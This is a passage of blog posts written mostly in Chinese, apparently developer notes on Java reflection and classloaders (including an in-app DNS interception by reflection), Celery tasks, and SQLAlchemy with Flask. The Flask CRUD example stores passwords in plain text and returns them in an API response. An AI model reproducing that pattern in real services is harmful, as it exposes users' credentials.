java.lang.InterruptedExceptionReturnType: voidModifier.toString: public final void wait () throws java.lang.InterruptedExceptionReturnType: booleanModifier.toString: public boolean equals (java.lang.Object arg0)ReturnType: class java.lang.StringModifier.toString: public java.lang.String toString ()ReturnType: intModifier.toString: public native int hashCode ()ReturnType: class java.lang.ClassModifier.toString: public final native java.lang.Class getClass ()ReturnType: voidModifier.toString: public final native void notify ()ReturnType: voidModifier.toString: public final native void notifyAll () 拿到方法（Method对象之后就要invoke了），不管是private还是public的 // 假设我们的class有这么两个方法,也是可以区分开来的 public void echo(String name){ System.out.println(name); } public void echo(){ System.out.println(&quot;some kind of echo &quot;); } public void callMethodViaReflection(){ String className = &quot;com.me.reflection._001_basic.MyObject&quot;; try { Class&lt;?&gt; fClass = Class.forName(className); Method method = fClass.getDeclaredMethod(&quot;greet&quot;); method.setAccessible(true); //如果这是一个private的method的话，要setAccessible method.invoke(fClass.newInstance()); Method public_method_with_params = fClass.getMethod(&quot;echo&quot;,String.class); public_method_with_params.invoke(fClass.newInstance(),&quot;this is params from reflection&quot;); Method public_method_without_params = fClass.getMethod(&quot;echo&quot;); public_method_without_params.invoke(fClass.newInstance()); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } } hello method without parametersthis is params from reflectionsome kind of echo 用反射给class的某个field赋值 public void setFiledWithReflection(){ String className = &quot;com.me.reflection._001_basic.MyObject&quot;; try { Class clss = Class.forName(className); Object obj = clss.newInstance(); Field field = clss.getDeclaredField(&quot;name&quot;); field.setAccessible(true); System.out.println(field.get(obj)); field.set(obj,&quot;this is some reflected filed&quot;); System.out.println(field.get(obj)); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (NoSuchFieldException e) { e.printStackTrace(); } } 反射相关的东西基本到此完事，实际生产中当然推荐使用成熟的框架，比如Spring Framework的ReflectionUtils.当然有些东西是没法用反射去修改的（用InvocationHandler只是夹带了私活），比如函数的内部逻辑，比如常量(因为编译器直接把常量换成对应的值了)。 比如从Tinker的代码库里面抄来这么一段： /** * Locates a given field anywhere in the class inheritance hierarchy. * * @param instance an object to search the field into. * @param name field name * @return a field object * @throws NoSuchFieldException if the field cannot be located */ public static Field findField(Object instance, String name) throws NoSuchFieldException { for (Class&lt;?&gt; clazz = instance.getClass(); clazz != null; clazz = clazz.getSuperclass()) { try { Field field = clazz.getDeclaredField(name); if (!field.isAccessible()) { field.setAccessible(true); } return field; } catch (NoSuchFieldException e) { // ignore and search next } } throw new NoSuchFieldException(&quot;Field &quot; + name + &quot; not found in &quot; + instance.getClass()); } public static Field findField(Class&lt;?&gt; originClazz, String name) throws NoSuchFieldException { for (Class&lt;?&gt; clazz = originClazz; clazz != null; clazz = clazz.getSuperclass()) { try { Field field = clazz.getDeclaredField(name); if (!field.isAccessible()) { field.setAccessible(true); } return field; } catch (NoSuchFieldException e) { // ignore and search next } } throw new NoSuchFieldException(&quot;Field &quot; + name + &quot; not found in &quot; + originClazz); } /** * Locates a given method anywhere in the class inheritance hierarchy. * * @param instance an object to search the method into. * @param name method name * @param parameterTypes method parameter types * @return a method object * @throws NoSuchMethodException if the method cannot be located */ public static Method findMethod(Object instance, String name, Class&lt;?&gt;... parameterTypes) throws NoSuchMethodException { for (Class&lt;?&gt; clazz = instance.getClass(); clazz != null; clazz = clazz.getSuperclass()) { try { Method method = clazz.getDeclaredMethod(name, parameterTypes); if (!method.isAccessible()) { method.setAccessible(true); } return method; } catch (NoSuchMethodException e) { // ignore and search next } } throw new NoSuchMethodException(&quot;Method &quot; + name + &quot; with parameters &quot; + Arrays.asList(parameterTypes) + &quot; not found in &quot; + instance.getClass()); } /** * Locates a given method anywhere in the class inheritance hierarchy. * * @param clazz a class to search the method into. * @param name method name * @param parameterTypes method parameter types * @return a method object * @throws NoSuchMethodException if the method cannot be located */ public static Method findMethod(Class&lt;?&gt; clazz, String name, Class&lt;?&gt;... parameterTypes) throws NoSuchMethodException { for (; clazz != null; clazz = clazz.getSuperclass()) { try { Method method = clazz.getDeclaredMethod(name, parameterTypes); if (!method.isAccessible()) { method.setAccessible(true); } return method; } catch (NoSuchMethodException e) { // ignore and search next } } throw new NoSuchMethodException(&quot;Method &quot; + name + &quot; with parameters &quot; + Arrays.asList(parameterTypes) + &quot; not found in &quot; + clazz); } /** * Locates a given constructor anywhere in the class inheritance hierarchy. * * @param instance an object to search the constructor into. * @param parameterTypes constructor parameter types * @return a constructor object * @throws NoSuchMethodException if the constructor cannot be located */ public static Constructor&lt;?&gt; findConstructor(Object instance, Class&lt;?&gt;... parameterTypes) throws NoSuchMethodException { for (Class&lt;?&gt; clazz = instance.getClass(); clazz != null; clazz = clazz.getSuperclass()) { try { Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(parameterTypes); if (!ctor.isAccessible()) { ctor.setAccessible(true); } return ctor; } catch (NoSuchMethodException e) { // ignore and search next } } throw new NoSuchMethodException(&quot;Constructor&quot; + &quot; with parameters &quot; + Arrays.asList(parameterTypes) + &quot; not found in &quot; + instance.getClass()); } 和反射相关的类应该还有Type，关于Type，最有名的就是从一个泛型类中获取泛型里面T的class对象。但这是有条件的。需要泛型定义在一个父类上，子类对象在初始化的时候确定一个T,后面就可以通过这个子类对象的实例来获得刚才这个T的class. Class&lt;?&gt; classType = Integer.TYPE; //这其实是一个class // 从泛型class中获取T的类型 public void someMethod(){ HashMap&lt;String,Integer&gt; map = new HashMap&lt;String, Integer&gt;(){}; Type mySuperclass = map.getClass().getGenericSuperclass(); Type type = ((ParameterizedType)mySuperclass).getActualTypeArguments()[0]; Type type2 = ((ParameterizedType)mySuperclass).getActualTypeArguments()[1]; System.out.println(mySuperclass);// java.util.HashMap&lt;java.lang.String, java.lang.Integer&gt; System.out.println(type+&quot; &quot;+type2); //class java.lang.String class java.lang.Integer } public void someMethod2(){ HashMap&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); // 类型擦除 Type mySuperclass = map.getClass().getGenericSuperclass(); Type type = ((ParameterizedType)mySuperclass).getActualTypeArguments()[0]; Type type2 = ((ParameterizedType)mySuperclass).getActualTypeArguments()[1]; System.out.println(mySuperclass); // java.util.AbstractMap&lt;K, V&gt; System.out.println(type+&quot; &quot;+type2); //K V } // 或者 public static abstract class Foo&lt;T&gt; { //content } public static class FooChild extends Foo&lt;String&gt; { //content } public static Type[] getParameterizedTypes(Object object) { Type superclassType = object.getClass().getGenericSuperclass(); if (!ParameterizedType.class.isAssignableFrom(superclassType.getClass())) { return null; } return ((ParameterizedType)superclassType).getActualTypeArguments(); } public static void main(String[] args) { Foo foo = new FooChild(); Type[] types= getParameterizedTypes(foo); System.out.println(types[0] == String.class); // true ,Type是一个接口，实现类只有Class } 看下来都是需要一个支持泛型的父类，然后子类继承这个父类并指定泛型中的T是哪个class，外部就可以拿着这个父类的指针(指向填充了T类型的子类的Object)调用getGenericSuperclass方法再转成ParameterizedType去调用getActualTypeArguments方法了。 这里面涉及到的类和接口包括:ParameterizedType,TypeVariable,GenericArrayType,WildcardType（这四个全部是接口）等Type详解由于类型擦除，class对象中并不能保有编译前的类的信息，引入Type似乎是为了迎合反射的需要。 Java 系统监控有一个小的技巧是，你可以使用kill -3 发一个SIGQUIT的信号给JVM，可以把堆栈信息（包括垃圾回收的信息）dump到stderr/logs。 ClassLoader的使用套路classloader和class的生命周期,知乎专栏 JVM 中内置了三个重要的 ClassLoader，分别是 BootstrapClassLoader、ExtensionClassLoader 和 AppClassLoader。 BootstrapClassLoader 负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.xxx.* 都在里面，比如 java.util.*、java.io.*、java.nio.*、java.lang.* 等等。这个 ClassLoader 比较特殊，它是由 C 代码实现的，我们将它称之为「根加载器」。 ExtensionClassLoader 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，有很多 jar 包。 AppClassLoader 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的。 那些位于网络上静态文件服务器提供的 jar 包和 class文件，jdk 内置了一个 URLClassLoader，用户只需要传递规范的网络路径给构造器，就可以使用 URLClassLoader 来加载远程类库了。 ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。 双亲委派 AppClassLoader 在加载一个未知的类名时，它并不是立即去搜寻 Classpath，它会首先将这个类名称交给 ExtensionClassLoader 来加载，如果 ExtensionClassLoader 可以加载，那么 AppClassLoader 就不用麻烦了。否则它就会搜索 Classpath 。 而 ExtensionClassLoader 在加载一个未知的类名时，它也并不是立即搜寻 ext 路径，它会首先将类名称交给 BootstrapClassLoader 来加载，如果 BootstrapClassLoader 可以加载，那么 ExtensionClassLoader 也就不用麻烦了。否则它就会搜索 ext 路径下的 jar 包。 这三个 ClassLoader 之间形成了级联的父子关系，每个 ClassLoader 都很懒，尽量把工作交给父亲做，父亲干不了了自己才会干。每个 ClassLoader 对象内部都会有一个 parent 属性指向它的父加载器。 $ cat ~/source/jcl/v1/Dep.java public class Dep { public void print() { System.out.println(&quot;v1&quot;); } } $ cat ~/source/jcl/v2/Dep.java public class Dep { public void print() { System.out.println(&quot;v1&quot;); } } $ cat ~/source/jcl/Test.java public class Test { public static void main(String[] args) throws Exception { String v1dir = &quot;file:///Users/qianwp/source/jcl/v1/&quot;; String v2dir = &quot;file:///Users/qianwp/source/jcl/v2/&quot;; URLClassLoader v1 = new URLClassLoader(new URL[]{new URL(v1dir)}); URLClassLoader v2 = new URLClassLoader(new URL[]{new URL(v2dir)}); Class&lt;?&gt; depv1Class = v1.loadClass(&quot;Dep&quot;); Object depv1 = depv1Class.getConstructor().newInstance(); depv1Class.getMethod(&quot;print&quot;).invoke(depv1); Class&lt;?&gt; depv2Class = v2.loadClass(&quot;Dep&quot;); Object depv2 = depv2Class.getConstructor().newInstance(); depv2Class.getMethod(&quot;print&quot;).invoke(depv2); System.out.println(depv1Class.equals(depv2Class)); } } 反射替换final成员变量的时候要小心一种全局拦截并监控 DNS 的方式 文中提到 try { //获取InetAddress中的impl Field impl = InetAddress.class.getDeclaredField(&quot;impl&quot;); impl.setAccessible(true); //获取accessFlags Field modifiersField = Field.class.getDeclaredField(&quot;accessFlags&quot;); modifiersField.setAccessible(true); //去final modifiersField.setInt(impl, impl.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL); //获取原始InetAddressImpl对象 final Object originalImpl = impl.get(null); //构建动态代理InetAddressImpl对象 Object dynamicImpl = Proxy.newProxyInstance(originalImpl.getClass().getClassLoader(), originalImpl.getClass().getInterfaces(), new InvocationHandler() { final Object lock = new Object(); Constructor&lt;Inet4Address&gt; constructor = null; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //如果函数名为lookupAllHostAddr，并且参数长度为2，第一个参数是host，第二个参数是netId if (method.getName().equals(&quot;lookupAllHostAddr&quot;) &amp;&amp; args != null &amp;&amp; args.length == 2) { Log.e(&quot;TAG&quot;, &quot;lookupAllHostAddr：&quot; + Arrays.asList(args)); //获取Inet4Address的构造函数，可能还需要Inet6Address的构造函数，为了演示，简单处理 if (constructor == null) { synchronized (lock) { if (constructor == null) { try { constructor = Inet4Address.class.getDeclaredConstructor(String.class, byte[].class); constructor.setAccessible(true); } catch (Exception e) { e.printStackTrace(); } } } } if (constructor != null) { //这里实现自己的逻辑 //构造一个mock的dns解析并返回 if (args[0] != null &amp;&amp; &quot;www.baidu.com&quot;.equalsIgnoreCase(args[0].toString())) { try { Inet4Address inetAddress = constructor.newInstance(null, new byte[]{(byte) 61, (byte) 135, (byte) 169, (byte) 121}); return new InetAddress[]{inetAddress}; } catch (Exception e) { e.printStackTrace(); } } } } return method.invoke(originalImpl, args); } }); //替换impl为动态代理对象 impl.set(null, dynamicImpl); //还原final modifiersField.setInt(impl, impl.getModifiers() &amp; java.lang.reflect.Modifier.FINAL); } catch (Exception e) { e.printStackTrace(); } todo反编译java代码的基本套路有直接去看hotspot源码来分析的classLoader related topics","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"celery-cheetsheet","date":"2018-07-03T08:43:41.000Z","path":"2018/07/03/2018-07-03-celery-cheetsheet/","text":"“There are only two hard things in Computer Science: cache invalidation and naming things.”— Phil Karlton 因为需要使用Redis，在ubuntu上安装redis可以用apt-get，也能自己下载源码去make（前提是内存充足，内存不足的话make test会失败）。所以我干脆关掉了几个比较耗内存的进程，最后直接用apt-get装上了。 下面这几步就算最简单的celery入门了 from celery import Celery app = Celery(&#39;tasks&#39;, broker=&#39;redis://localhost:6379/0&#39;) @app.task def add(x, y): return x + y celery -A tasks worker –loglevel=info &gt;&gt;&gt; from tasks import add &gt;&gt;&gt; add.delay(4, 4) 注意，windows上celery4不完全支持celery-raises-valueerror-not-enough-values-to-unpack 基本的项目结构 proj/__init__.py /celery.py /tasks.py proj/celery.py from __future__ import absolute_import, unicode_literals from celery import Celery app = Celery(&#39;proj&#39;, broker=&#39;amqp://&#39;, backend=&#39;amqp://&#39;, include=[&#39;proj.tasks&#39;]) # Optional configuration, see the application user guide. app.conf.update( result_expires=3600, ) if __name__ == &#39;__main__&#39;: app.start() ##耗时的任务都丢到这里就好了proj/tasks.py from __future__ import absolute_import, unicode_literals from .celery import app @app.task def add(x, y): return x + y @app.task def mul(x, y): return x * y @app.task def xsum(numbers): return sum(numbers) 注意下面的命令要在proj项目上层目录中运行 celery -A proj worker -l info 执行异步方法，这俩都行：add.delay(2, 2)add.apply_async((2, 2)) ##这句话并不会阻塞在这里，后面的方法接着执行，也就达到了异步执行的目的 在django项目中使用celerydjango-celery-example 生产环境需要supervisor守护celery sudo apt-get install supervisor/etc/supervisor/conf.d/something.conf[program:celery]command=/home/deploy/.virtualenvs/my_env/bin/celery –app=proj_name worker –loglevel=INFOdirectory=/home/deploy/webapps/django_projectuser=user_nameautostart=trueautorestart=trueredirect_stderr=true 刷新一下supervisor任务sudo supervisorctl rereadsudo supervisorctl update ##启动celerysudo supervisorctl start celery ## 失败了自动retry from celery import shared_task @shared_task(bind=True, max_retries=3) # you can determine the max_retries here def access_awful_system(self, my_obj_id): from core.models import Object from requests import ConnectionError o = Object.objects.get(pk=my_obj_id) # If ConnectionError try again in 180 seconds try: o.access_awful_system() except ConnectionError as exc: self.retry(exc=exc, countdown=180) # the task goes back to the queue ##重试时间指数型增长也行 @celery_app.task(max_retries=10) def notify_gcm_device(device_token, message, data=None): notification_json = build_gcm_json(message, data=data) try: gcm.notify_device(device_token, json=notification_json) except ServiceTemporarilyDownError: # Find the number of attempts so far num_retries = notify_gcm_device.request.retries seconds_to_wait = 2.0 ** num_retries # First countdown will be 1.0, then 2.0, 4.0, etc. raise notify_gcm_device.retry(countdown=seconds_to_wait) ## eta 像crontab一样定期执行任务 from django.utils import timezone from datetime import timedelta now = timezone.now() # later is one hour from now later = now + timedelta(hours=1) access_awful_system.apply_async((object_id), eta=later) 创建多个queue# CELERY ROUTES CELERY_ROUTES = { &#39;core.tasks.too_long_task&#39;: {&#39;queue&#39;: &#39;too_long_queue&#39;}, &#39;core.tasks.quick_task&#39;: {&#39;queue&#39;: &#39;quick_queue&#39;}, } # For too long queue celery --app=proj_name worker -Q too_long_queue -c 2 # For quick queue celery --app=proj_name worker -Q quick_queue -c 2 可以subclass task，比如自定义缓存什么的 class MyTask(celery.Task): ignore_result = False # in case you set it to True globally — you should! def __init__(self): # This code is only called once per worker. # Here you can define members, which will be accessible when the task runs, later on. self.cache = {} def run(self, user_id, arg): # Now the task is executing. # We have the ‘cache’ at our disposal! return self.normal_operation(user_id, arg) def normal_operation(self, user_id, arg): if (user_id, arg) in self.cache: return self.cache[(user_id, arg)] retval = self.some_value(user_id, arg) self.cache[(user_id, arg)] = retval return retval referencescelery有一个监控工具Flowerasynchronous-tasks-with-django-and-celerymy-experiences-with-a-long-running-celery-based-microprocess","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"sqlalchemy速查手册","date":"2018-07-02T21:12:31.000Z","path":"2018/07/02/2018-07-02-sqlalchemy-cheetsheet/","text":"pip install SQLAlchemy from sqlalchemy import create_engine ## 想用sqlite? engine = create_engine(&#39;sqlite:///foo.db&#39;, echo=True) ## 会在当前目录下生成一个foo.db文件，这个True表示程序运行的时候会打印出生成的sql语句。 ## 想用mysql? engine = create_engine(&#39;mysql+mysqlconnector://%s:%s@localhost:3306/%s?charset=utf8&#39; % (config.DB_USER_NAME,config.DB_PASS_WORD,config.DB_NAME)) ## mysql也是支持的 这里有一个坑： ## mysql://username:password@server/db python3下面不能这么写，虽然flask-sqlalchemy教程上是这么教人的 ## mysql+pymysql://username:password@server/db 应该这么写，还有pip install PyMySQL ## postgresql也是可以的 engine = create_engine(&quot;postgresql://scott:tiger@localhost/test&quot;) 创建db的时候注意,sqlite因为是直接写文件，所以要把db的路径写清楚了。如果贸然写一个’sqlite:///db.sqlite3’，可能会出现no such tableconfig.py文件里面 import os project_dir = os.path.dirname(os.path.abspath(__file__)) SQLALCHEMY_DATABASE_URI = &quot;sqlite:///{}&quot;.format(os.path.join(project_dir, &quot;backend.db&quot;)) 数据库创建了，开始建表设计表其实一般没必要这么搞，直接db.create_all()得了 ## create table if not exists engine = create_engine(&quot;sqlite:///myexample.db&quot;) # Access the DB Engine if not engine.dialect.has_table(engine, Variable_tableName): # If table don&#39;t exist, Create. metadata = MetaData(engine) # Create a table with the appropriate Columns ##主键，auto_increment是这么设置的 Table(Variable_tableName, metadata, Column(&#39;Id&#39;, Integer, primary_key=True, nullable=False,autoincrement = True), Column(&#39;Date&#39;, Date), Column(&#39;Country&#39;, String), Column(&#39;Brand&#39;, String), Column(&#39;Price&#39;, Float), # Implement the creation metadata.create_all() Flask比较好的地方是可以和SQLAlechemy紧密结合Flask一起用代码出处 from flask_sqlalchemy import SQLAlchemy from flask import Flask, jsonify, request import configparser app = Flask(__name__) my_config = configparser.ConfigParser() my_config.read(&#39;db.conf&#39;) app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;mysql://&#39; + my_config.get(&#39;DB&#39;, &#39;DB_USER&#39;) + &#39;:&#39; + my_config.get(&#39;DB&#39;, &#39;DB_PASSWORD&#39;) + &#39;@&#39; + my_config.get(&#39;DB&#39;, &#39;DB_HOST&#39;) + &#39;/&#39; + my_config.get(&#39;DB&#39;, &#39;DB_DB&#39;) app.config[&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;] = True mydb = SQLAlchemy() mydb.init_app(app) # 用户模型 class User(mydb.Model): user_id = mydb.Column(mydb.Integer, primary_key=True) user_name = mydb.Column(mydb.String(60), nullable=False) user_password = mydb.Column(mydb.String(30), nullable=False) user_nickname = mydb.Column(mydb.String(50)) user_email = mydb.Column(mydb.String(30), nullable=False) def __repr__(self): return &#39;&lt;User %r&gt;&#39; % self.user_name # 获取用户列表 @app.route(&#39;/users&#39;, methods=[&#39;GET&#39;]) def getUsers(): data = User.query.all() datas = [] for user in data: datas.append({&#39;user_id&#39;: user.user_id, &#39;user_name&#39;: user.user_name, &#39;user_nickname&#39;: user.user_nickname, &#39;user_email&#39;: user.user_email}) return jsonify(data=datas) # 添加用户数据 @app.route(&#39;/user&#39;, methods=[&#39;POST&#39;]) def addUser(): user_name = request.form.get(&#39;user_name&#39;) user_password = request.form.get(&#39;user_password&#39;) user_nickname = request.form.get(&#39;user_nickname&#39;) user_email = request.form.get(&#39;user_email&#39;) user = User(user_name=user_name, user_password=user_password, user_nickname=user_nickname, user_email=user_email) try: mydb.session.add(user) mydb.session.commit() except: mydb.session.rollback() mydb.session.flush() userId = user.user_id if (user.user_id is None): result = {&#39;msg&#39;: &#39;添加失败&#39;} return jsonify(data=result) data = User.query.filter_by(user_id=userId).first() result = {&#39;user_id&#39;: user.user_id, &#39;user_name&#39;: user.user_name, &#39;user_nickname&#39;: user.user_nickname, &#39;user_email&#39;: user.user_email} return jsonify(data=result) # 获取单条数据 @app.route(&#39;/user/&lt;int:userId&gt;&#39;, methods=[&#39;GET&#39;]) def getUser(userId): user = User.query.filter_by(user_id=userId).first() if (user is None): result = {&#39;msg&#39;: &#39;找不到数据&#39;} else: result = {&#39;user_id&#39;: user.user_id, &#39;user_name&#39;: user.user_name, &#39;user_nickname&#39;: user.user_nickname, &#39;user_email&#39;: user.user_email} return jsonify(data=result) # 修改用户数据 @app.route(&#39;/user/&lt;int:userId&gt;&#39;, methods=[&#39;PATCH&#39;]) def updateUser(userId): user_name = request.form.get(&#39;user_name&#39;) user_password = request.form.get(&#39;user_password&#39;) user_nickname = request.form.get(&#39;user_nickname&#39;) user_email = request.form.get(&#39;user_email&#39;) try: user = User.query.filter_by(user_id=userId).first() if (user is None): result = {&#39;msg&#39;: &#39;找不到要修改的记录&#39;} return jsonify(data=result) else: user.user_name = user_name user.user_password = user_password user.user_nickname = user_nickname user.user_email = user_email mydb.session.commit() except: mydb.session.rollback() mydb.session.flush() userId = user.user_id data = User.query.filter_by(user_id=userId).first() result = {&#39;user_id&#39;: user.user_id, &#39;user_name&#39;: user.user_name, &#39;user_password&#39;: user.user_password, &#39;user_nickname&#39;: user.user_nickname, &#39;user_email&#39;: user.user_email} return jsonify(data=result) # 删除用户数据 @app.route(&#39;/user/&lt;int:userId&gt;&#39;, methods=[&#39;DELETE&#39;]) def deleteUser(userId): User.query.filter_by(user_id=userId).delete() mydb.session.commit() return getUsers() if __name__ == &#39;__main__&#39;: app.run(debug=True) sclalchemy的model的tablename默认是会根据model的name生成小写的tablename: For instance the table name is automatically set for you unless overridden. It’s derived from the class name converted to lowercase and with “CamelCase” converted to “camel_case”. To override the table name, set the tablename class attribute. 来看看curd的一些常用的地方,query ApiFlask SQLAlchemy query api &gt;&gt;&gt; peter = User.query.filter_by(username=&#39;peter&#39;).first() &gt;&gt;&gt; peter.id 2 &gt;&gt;&gt; peter.email u&#39;peter@example.org&#39; sqlalchemy这种orm也是需要加锁的 sqlalchemy.exc.InvalidRequestError: When initializing mapper Mapper|Newscate|newscate, expression &#39;News&#39; failed to locate a name (&quot;name &#39;News&#39; is not defined&quot;). If this is a class name, consider adding this relationship() to the &lt;class &#39;category.models.Newscate&#39;&gt; class after both dependent classes have been defined. flask-sqlalchemy关于一对多，多对多关系的解释抄来的model,一对多关系，一个User可以有多个News，一个Newscategory可以有多个News from sqlalchemy import Table, MetaData, Column, Integer, String, ForeignKey from database import db as mydb class User(mydb.Model): __tablename__=&quot;t_user&quot; user_id = mydb.Column(mydb.Integer, primary_key=True) user_name = mydb.Column(mydb.String(60), nullable=False) user_password = mydb.Column(mydb.String(30), nullable=False) user_nickname = mydb.Column(mydb.String(50), nullable=False) user_email = mydb.Column(mydb.String(100), nullable=False) newses = mydb.relationship(&#39;News&#39;, backref=&#39;user&#39;, lazy=True) def __repr__(self): return &#39;&lt;User %r&gt;&#39; % self.user_nickname class Newscate(mydb.Model): __tablename__=&quot;t_newscat&quot; cate_id = mydb.Column(mydb.Integer, primary_key=True) cate_name = mydb.Column(mydb.String(50), nullable=False) cate_title = mydb.Column(mydb.String(50), nullable=False) newses = mydb.relationship(&#39;News&#39;, backref=&#39;newscate&#39;, lazy=True) def __repr__(self): return &#39;&lt;Newscate %r&gt;&#39; % self.cate_name class News(mydb.Model): __tablename__=&quot;t_news&quot; news_id = mydb.Column(mydb.Integer, primary_key=True) news_date = mydb.Column(mydb.DateTime, nullable=False) news_content = mydb.Column(mydb.Text, nullable=False) news_title = mydb.Column(mydb.String(100), nullable=False) news_excerpt = mydb.Column(mydb.Text, nullable=False) news_status = mydb.Column(mydb.String(20), nullable=False) news_modified = mydb.Column(mydb.DateTime, nullable=False) news_category = mydb.Column(mydb.Integer, mydb.ForeignKey(&#39;t_newscat.cate_id&#39;), nullable=False) news_author = mydb.Column(mydb.Integer, mydb.ForeignKey(&#39;t_user.user_id&#39;), nullable=False) def __repr__(self): return &#39;&lt;News %r&gt;&#39; % self.news_title 开始建表吧，直接在shell里面搞要快很多 &gt;&gt;&gt; python from app import app ## 这个app是一个Flask实例 from database import db from models import News,User,Newscate app.app_context().push() ## 这句话是必须的[context](http://flask-sqlalchemy.pocoo.org/2.3/contexts/) db.create_all() 如果只要创建一张表的话可以这么干Model.table.create(session.bind) 来看看生成的sql语句 CREATE TABLE t_user ( user_id INTEGER NOT NULL AUTO_INCREMENT, user_name VARCHAR(60) NOT NULL, user_password VARCHAR(30) NOT NULL, user_nickname VARCHAR(50) NOT NULL, user_email VARCHAR(100) NOT NULL, PRIMARY KEY (user_id) ) CREATE TABLE t_newscat ( cate_id INTEGER NOT NULL AUTO_INCREMENT, cate_name VARCHAR(50) NOT NULL, cate_title VARCHAR(50) NOT NULL, PRIMARY KEY (cate_id) ) CREATE TABLE t_news ( news_id INTEGER NOT NULL AUTO_INCREMENT, news_date DATETIME NOT NULL, news_content TEXT NOT NULL, news_title VARCHAR(100) NOT NULL, news_excerpt TEXT NOT NULL, news_status VARCHAR(20) NOT NULL, news_modified DATETIME NOT NULL, news_category INTEGER NOT NULL, news_author INTEGER NOT NULL, PRIMARY KEY (news_id), FOREIGN KEY(news_category) REFERENCES t_newscat (cate_id), FOREIGN KEY(news_author) REFERENCES t_user (user_id) ) 生成表之后，开始插入数据，还是在shell里面，快一点 &gt;&gt; User.query.all() [] ##数据为空 &gt;&gt;&gt; robin = User(user_name=&quot;Tim&quot;,user_password=&quot;secret&quot;,user_nickname=&quot;tim_nick&quot;,user_email=&quot;lenon@gmail.com&quot;) &gt;&gt;&gt; robin.user_email &#39;lenon@gmail.com&#39; &gt;&gt;&gt; robin.newses ## 注意，db中user并没有newses这个column [] &gt;&gt;&gt; robin.user_id &gt;&gt;&gt; ##什么都没有，因为还没有commit到数据库，那么commit一下 &gt;&gt;&gt; robin.user_id &gt;&gt;&gt; db.session.add(robin) &gt;&gt;&gt; db.session.commit() 再查找一下 &gt;&gt;&gt; robin.user_id 2018-07-15 10:26:58,358 INFO sqlalchemy.engine.base.Engine BEGIN (implicit) 2018-07-15 10:26:58,358 INFO sqlalchemy.engine.base.Engine SELECT t_user.user_id AS t_user_user_id, t_user.user_name AS t_user_user_name, t_user.user_password AS t_user_user_password, t_user.user_nickname AS t_user_user_nickname, t_user.user_email AS t_user_user_email FROM t_user WHERE t_user.user_id = %(param_1)s 2018-07-15 10:26:58,359 INFO sqlalchemy.engine.base.Engine {&#39;param_1&#39;: 1} &gt;&gt;&gt; 1 ##这回就有了 因为news依赖两个Foreign key，user和newcate，且都不为空，所以在创建News之前得先创建Newscate &gt;&gt;&gt; breaking_news = Newscate(cate_name=&quot;beaking_news&quot;,cate_title=&quot;breaking News&quot;) &gt;&gt;&gt; breaking_news &lt;Newscate &#39;beaking_news&#39;&gt; &gt;&gt;&gt; breaking_news.cate_title &#39;breaking News&#39; &gt;&gt;&gt;db.session.add(breaking_news) &gt;&gt;&gt;db.session.commit() &gt;&gt;&gt;breaking_news.cate_id 1 ## 查下数据库，User和Newscate里面都有数据了 newsitem = News(news_date=datetime.utcnow(),news_content=&quot;content of news item one&quot;,news_title=&quot;title of news item one&quot;,news_excerpt=&quot;excerpt of news item one&quot;,news_status=&quot;normal&quot;,news_modified=datetime.now(),news_category=2,news_author=1) &gt;&gt;&gt; newsitem &lt;News &#39;title of news item one&#39;&gt; &gt;&gt;&gt; db.session.add(newsitem) &gt;&gt;&gt; db.session.commit() 2018-07-15 10:42:11,134 INFO sqlalchemy.engine.base.Engine BEGIN (implicit) 2018-07-15 10:42:11,135 INFO sqlalchemy.engine.base.Engine INSERT INTO t_news (news_date, news_content, news_title, news_excerpt, news_status, news_modified, news_category, news_author) VALUES (%(news_date)s, %(news_content)s, %(news_title)s, %(news_excerpt)s, %(news_status)s, %(news_modified)s, %(news_category)s, %(news_author)s) 2018-07-15 10:42:11,136 INFO sqlalchemy.engine.base.Engine {&#39;news_date&#39;: datetime.datetime(2018, 7, 15, 2, 41, 50, 454505), &#39;news_content&#39;: &#39;content of news item one&#39;, &#39;news_title&#39;: &#39;title of news item one&#39;, &#39;news_excerpt&#39;: &#39;excerpt of news item one&#39;, &#39;news_status&#39;: &#39;normal&#39;, &#39;news_modified&#39;: datetime.datetime(2018, 7, 15, 10, 41, 50, 454505), &#39;news_category&#39;: 2, &#39;news_author&#39;: 1} 2018-07-15 10:42:11,141 INFO sqlalchemy.engine.base.Engine COMMIT 查下数据库，News也插入成功 后面开始在gui界面中往数据库里面插入一些数据，准备好假数据之后要db.session.commit()一下才会在sqlalchemy这边同步一下。(session好像也没有什么类似于sync的api) 开始查询： 根据一个Newsid去查找这篇news的user&gt;&gt;&gt; News.query.all()[0].news_author 1 ##正常啊，这里存储的就是user的id,但是我们想要User，还记得上面建表的时候那个&quot;backref&quot;嘛，写的是backref=&#39;user&#39; &gt;&gt;&gt; News.query.all()[0].user &lt;User &#39;tim_nick&#39;&gt; 查询所有发表过News的User（就是user.newses不为空List）&gt;&gt;&gt; User.query.filter(func.length(User.newses) &gt; 0).all() [&lt;User &#39;tim_nick&#39;&gt;, &lt;User &#39;bounty hounter&#39;&gt;, &lt;User &#39;sally williams&#39;&gt;, &lt;User &#39;john doe&#39;&gt;]显然不正确 这种情况的一般sql语句应该是这么写的 &gt;&gt;&gt;SELECT t_user.user_id AS t_user_user_id, t_user.user_name AS t_user_user_name, 